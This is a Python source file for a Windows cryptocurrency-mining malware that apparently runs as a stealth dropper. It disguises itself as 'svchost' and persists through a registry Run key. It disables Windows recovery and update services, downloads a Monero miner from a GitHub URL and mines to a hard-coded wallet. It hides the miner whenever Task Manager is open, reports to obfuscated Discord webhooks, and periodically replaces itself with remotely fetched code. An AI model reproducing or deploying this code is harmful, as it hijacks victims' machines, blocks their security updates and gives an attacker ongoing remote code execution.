import os, sys, subprocess, random, time, winreg, base64, argparse, platform, ctypes

# OBFUSCATED WEBHOOKS
W_S = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMzg3NTk1NDYzMDcyMTcxNy9mcVRQeFk5LWR0UnR1ZjNXUFFuZWhNa1Y1REp1Tm9ocGpzbjB0WFZITHZJdUt3VU9HMzAzcmNlM3ZxRjJVN1pvYzl2Mw==").decode()
W_M = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMzg3NjM2NDYzMjMyNjE0NS9ZbFE2MldOaThzUHZZZWlBZlQ5bklCMjVGUFI0ay1Nb1A3MVFTRU5LdTA2eFVOSUFKV2JpWEtKSi03cGExZm9PZmw0SEI=").decode()

HIDE_WINDOW = 0x08000000
ID = "svchost"
WORK_DIR = os.path.join(os.getenv('APPDATA'), ID)
if not os.path.exists(WORK_DIR): os.makedirs(WORK_DIR)

def bootstrap():
    try:
        import requests, psutil
    except ImportError:
        flag = os.path.join(WORK_DIR, ".boot")
        if os.path.exists(flag): return
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "psutil"], creationflags=HIDE_WINDOW, timeout=120)
            with open(flag, "w") as f: f.write("1")
            os.execv(sys.executable, [sys.executable] + sys.argv)
        except: pass

bootstrap()
import requests, psutil

# CONFIG
WALLET = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
POOL = "pool.supportxmr.com:443"
MIN_SRC = "https://github.com/itzcurled/footbalhunt/raw/main/mui_cache.bin"
UP_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"

CONFIG = {
    "MINER": os.path.join(WORK_DIR, "mui_cache.bin"),
    "WATCH": "Taskmgr.exe",
    "IDLE_PWR": "90",
    "NORM_PWR": "25",
    "IDLE_SEC": 300
}

def notify(msg, type="sys"):
    hook = W_S if type == "sys" else W_M
    try: requests.post(hook, json={"content": f"**[{platform.node()} | {ID}]**: {msg}"}, timeout=10)
    except: pass

def set_svc(name):
    try:
        path = f"SYSTEM\\CurrentControlSet\\Services\\{name}"
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 4)
        winreg.CloseKey(key)
    except: pass

def engage():
    try:
        run_p = base64.b64decode("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu").decode()
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_p, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, ID, 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.realpath(__file__)}"')
        winreg.CloseKey(key)
    except: pass
    subprocess.run(["reagentc", "/disable"], capture_output=True, creationflags=HIDE_WINDOW)
    for s in ["wuauserv", "bits", "dosvc"]: set_svc(s)
    if not os.path.exists(CONFIG["MINER"]):
        try:
            r = requests.get(MIN_SRC, timeout=60)
            if r.status_code == 200:
                with open(CONFIG["MINER"], "wb") as f: f.write(r.content)
        except: pass

class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]

def get_idle():
    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
        return (ctypes.windll.kernel32.GetTickCount() - lii.dwTime) / 1000.0
    return 0

def manage():
    mon = any(p.info['name'] == CONFIG["WATCH"] for p in psutil.process_iter(['name']))
    proc = None
    for p in psutil.process_iter(['name', 'exe']):
        try:
            if p.info['exe'] and os.path.normpath(p.info['exe']) == os.path.normpath(CONFIG["MINER"]):
                proc = p
                break
        except: continue
    if mon:
        if proc: 
            try: proc.terminate()
            except: pass
            notify("Monitoring detected. Vanishing.", "sys")
    else:
        idle = get_idle()
        pwr = CONFIG["IDLE_PWR"] if idle > CONFIG["IDLE_SEC"] else CONFIG["NORM_PWR"]
        if not proc:
            try:
                subprocess.Popen([CONFIG["MINER"], "-o", POOL, "-u", f"{WALLET}.{platform.node()}", "--max-cpu-usage", pwr, "-k", "--tls"], creationflags=HIDE_WINDOW)
                notify(f"Engine Engaged. Power: {pwr}%", "mine")
            except: pass

def main():
    time.sleep(random.randint(15, 45))
    engage()
    notify("SYSTEM ONLINE (v6.5 - Stealth mui_cache active)", "sys")
    up_t = time.time()
    while True:
        manage()
        if time.time() - up_t > 43200:
            try:
                r = requests.get(UP_URL, timeout=30)
                if r.status_code == 200:
                    with open(__file__, 'r') as f: cur = f.read()
                    if r.text != cur:
                        with open(__file__, 'w') as f: f.write(r.text)
                        os.execv(sys.executable, [sys.executable, __file__])
            except: pass
            up_t = time.time()
        time.sleep(15)

if __name__ == "__main__":
    main()
